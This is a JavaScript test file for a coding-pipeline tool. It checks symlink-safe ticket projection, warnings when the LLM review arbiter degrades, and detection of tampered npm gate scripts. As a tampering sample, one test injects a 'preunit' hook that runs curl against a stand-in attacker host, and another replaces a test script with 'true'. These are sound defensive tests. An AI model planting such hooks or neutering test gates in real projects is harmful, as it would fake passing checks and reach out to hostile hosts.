import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync, symlinkSync, rmSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { fileURLToPath } from 'node:url';

import { compilePlan, projectionErrorIsFatal } from '../lib/plan.mjs';
import { triageFindings } from '../lib/review.mjs';
import { verifyGateScriptIntegrity } from '../lib/plan-integrity.mjs';

const FAKE_AGY = fileURLToPath(new URL('./fixtures/fake-agy', import.meta.url));

// ---------------------------------------------------------------------------
// 1. lib/plan.mjs — projectionErrorIsFatal & compilePlan fail-closed behavior
// ---------------------------------------------------------------------------

test('projectionErrorIsFatal: treats symlink-refusal and ticket-store integrity errors as fatal', () => {
  assert.equal(projectionErrorIsFatal(Object.assign(new Error('legacy'), { code: 'LEGACY_TICKET_STORE' })), true);
  assert.equal(projectionErrorIsFatal(Object.assign(new Error('too many links'), { code: 'ELOOP' })), true);
  assert.equal(projectionErrorIsFatal(Object.assign(new Error('blocked'), { code: 'ERR_SYMLINK' })), true);
  assert.equal(projectionErrorIsFatal(Object.assign(new Error('unsafe'), { code: 'UNSAFE_STORE_PATH' })), true);
  assert.equal(projectionErrorIsFatal(new Error('refusing to project tickets through a symlink: /repo/.adlc')), true);
  assert.equal(projectionErrorIsFatal(Object.assign(new Error('already exists'), { code: 'STORE_EXISTS' })), true);
  assert.equal(projectionErrorIsFatal(Object.assign(new Error('corrupt'), { code: 'STORE_CORRUPT' })), true);
  assert.equal(projectionErrorIsFatal(Object.assign(new Error('bad store'), { name: 'TicketStoreError' })), true);
  assert.equal(projectionErrorIsFatal(new Error('failed to write ticket store manifest')), true);
  assert.equal(projectionErrorIsFatal(new Error('invalid .store.json')), true);

  // Non-fatal generic/operational errors remain warnings
  assert.equal(projectionErrorIsFatal(new Error('disk full')), false);
  assert.equal(projectionErrorIsFatal(Object.assign(new Error('perm'), { code: 'EACCES' })), false);
  assert.equal(projectionErrorIsFatal(null), false);
  assert.equal(projectionErrorIsFatal(undefined), false);
});

test('compilePlan: fails closed when .adlc or .adlc/tickets is a symlink instead of downgrading to a warning', async () => {
  const brainDir = mkdtempSync(join(tmpdir(), 'agb-audit-brain-'));
  const repo = mkdtempSync(join(tmpdir(), 'agb-audit-repo-'));
  const outside = mkdtempSync(join(tmpdir(), 'agb-audit-outside-'));
  try {
    mkdirSync(join(repo, 'lib'), { recursive: true });
    writeFileSync(join(repo, 'lib', 'mod.mjs'), 'export const x = 1;\n');
    writeFileSync(join(repo, 'package.json'), '{"name":"audit-symlink-test"}\n');
    // Plant a symlink at .adlc/tickets pointing outside the repo
    mkdirSync(join(repo, '.adlc'), { recursive: true });
    symlinkSync(outside, join(repo, '.adlc', 'tickets'));

    // Structured spec that succeeds via fast-path (0 LLM calls)
    const convDir = join(brainDir, 'audit-symlink-conv');
    mkdirSync(convDir, { recursive: true });
    writeFileSync(
      join(convDir, 'implementation_plan.md'),
      [
        '# Symlink Projection Test',
        '',
        '### Ticket 1: `T-SYM-1` — Update mod',
        '- **Scope**: `lib/mod.mjs`',
        '- **Rails**: `package.json`',
        '- **Tier**: `mid`',
        '',
        '#### Requirements',
        'Export `y = 2` from `lib/mod.mjs`.',
        '',
        '#### Acceptance Criteria',
        '- [ ] `lib/mod.mjs` exports `y = 2`.',
      ].join('\n'),
    );

    const prevAgy = process.env.AGB_AGY_BIN;
    process.env.AGB_AGY_BIN = '/nonexistent-agy-binary';
    try {
      await assert.rejects(
        compilePlan('audit-symlink-conv', {
          repo,
          brainDir,
          gate: { test: 'npm test' },
          coldstart: false,
          parallax: false,
          premortem: false,
        }),
        /symlink/i,
      );
    } finally {
      if (prevAgy === undefined) delete process.env.AGB_AGY_BIN;
      else process.env.AGB_AGY_BIN = prevAgy;
    }
  } finally {
    rmSync(brainDir, { recursive: true, force: true });
    rmSync(repo, { recursive: true, force: true });
    rmSync(outside, { recursive: true, force: true });
  }
});

// ---------------------------------------------------------------------------
// 2. lib/review.mjs — triageFindings degraded fallback warning & metadata
// ---------------------------------------------------------------------------

test('triageFindings: emits console.warn and sets arbiterDegraded/arbiterError when arbiter throws', async () => {
  const warnings = [];
  const origWarn = console.warn;
  console.warn = (...args) => warnings.push(args.join(' '));
  try {
    const failingPools = {
      async acquire() {
        throw new Error('simulated pool acquire failure');
      },
      summary() {
        return {};
      },
    };
    const res = await triageFindings({
      findings: [
        {
          id: 'F-001',
          severity: 'high',
          file: 'lib/a.mjs',
          claim: 'Unhandled null dereference',
          evidence: 'lib/a.mjs:42',
        },
      ],
      targetType: 'code',
      pools: failingPools,
      model: 'claude-sonnet-4-6',
      arbiter: true,
    });

    assert.equal(res.arbiterDegraded, true);
    assert.equal(res.arbiterError, 'simulated pool acquire failure');
    assert.equal(res.gateVerdict, 'ITERATE');
    assert.equal(warnings.length, 1);
    assert.match(warnings[0], /simulated pool acquire failure/);
  } finally {
    console.warn = origWarn;
  }
});

test('triageFindings: emits console.warn and sets arbiterDegraded/arbiterError when arbiter returns non-conforming output', async () => {
  const warnings = [];
  const origWarn = console.warn;
  const prevAgy = process.env.AGB_AGY_BIN;
  process.env.AGB_AGY_BIN = FAKE_AGY;
  console.warn = (...args) => warnings.push(args.join(' '));
  try {
    // fake-agy returns default non-conforming JSON (no triaged array)
    const res = await triageFindings({
      findings: [
        {
          id: 'F-002',
          severity: 'medium',
          file: 'lib/b.mjs',
          claim: 'Missing bounds check',
          evidence: 'lib/b.mjs:10',
        },
      ],
      targetType: 'code',
      arbiter: true,
    });

    assert.equal(res.arbiterDegraded, true);
    assert.equal(typeof res.arbiterError, 'string');
    assert.ok(res.arbiterError.length > 0);
    assert.equal(warnings.length, 1);
    assert.match(warnings[0], /LLM arbiter failed/);
  } finally {
    console.warn = origWarn;
    if (prevAgy === undefined) delete process.env.AGB_AGY_BIN;
    else process.env.AGB_AGY_BIN = prevAgy;
  }
});

test('triageFindings: does not warn or mark arbiterDegraded when arbiter is explicitly disabled', async () => {
  const warnings = [];
  const origWarn = console.warn;
  console.warn = (...args) => warnings.push(args.join(' '));
  try {
    const res = await triageFindings({
      findings: [
        {
          id: 'F-003',
          severity: 'high',
          file: 'lib/c.mjs',
          claim: 'Blocking issue',
          evidence: 'lib/c.mjs:5',
        },
      ],
      targetType: 'code',
      arbiter: false,
    });

    assert.equal(res.arbiterDegraded, undefined);
    assert.equal(res.arbiterError, undefined);
    assert.equal(warnings.length, 0);
  } finally {
    console.warn = origWarn;
  }
});

// ---------------------------------------------------------------------------
// 3. lib/plan-integrity.mjs — extractDelegatedScripts with optional npm flags
// ---------------------------------------------------------------------------

test('verifyGateScriptIntegrity: extracts delegated scripts preceded by npm run flags', () => {
  const cases = [
    'npm run --silent unit',
    'npm run -s unit',
    'npm run --if-present unit',
    'npm run -s --if-present --loglevel=silent unit',
    'npm run-script --silent unit',
    'npm --silent run --if-present unit',
    'npm run --silent lint && npm run -s unit',
  ];

  for (const testCmd of cases) {
    const baselinePkg = {
      scripts: {
        test: testCmd,
        lint: 'eslint .',
        unit: 'node --test',
      },
    };
    // Unmodified candidate must pass
    assert.equal(
      verifyGateScriptIntegrity(structuredClone(baselinePkg), baselinePkg, 'npm test'),
      true,
      `clean candidate should pass for: ${testCmd}`,
    );

    // Tampering with delegated `unit` script must be caught
    const tamperedPkg = structuredClone(baselinePkg);
    tamperedPkg.scripts.unit = 'true';
    assert.throws(
      () => verifyGateScriptIntegrity(tamperedPkg, baselinePkg, 'npm test'),
      (err) => err.kind === 'gate_script_tampering' && /unit/.test(err.message),
      `tampered delegated script 'unit' must be caught for: ${testCmd}`,
    );

    // Injecting a `preunit` lifecycle hook must also be caught
    const injectedHookPkg = structuredClone(baselinePkg);
    injectedHookPkg.scripts.preunit = 'curl http://evil.example';
    assert.throws(
      () => verifyGateScriptIntegrity(injectedHookPkg, baselinePkg, 'npm test'),
      (err) => err.kind === 'gate_script_tampering' && /preunit/.test(err.message),
      `injected lifecycle hook 'preunit' must be caught for: ${testCmd}`,
    );
  }
});
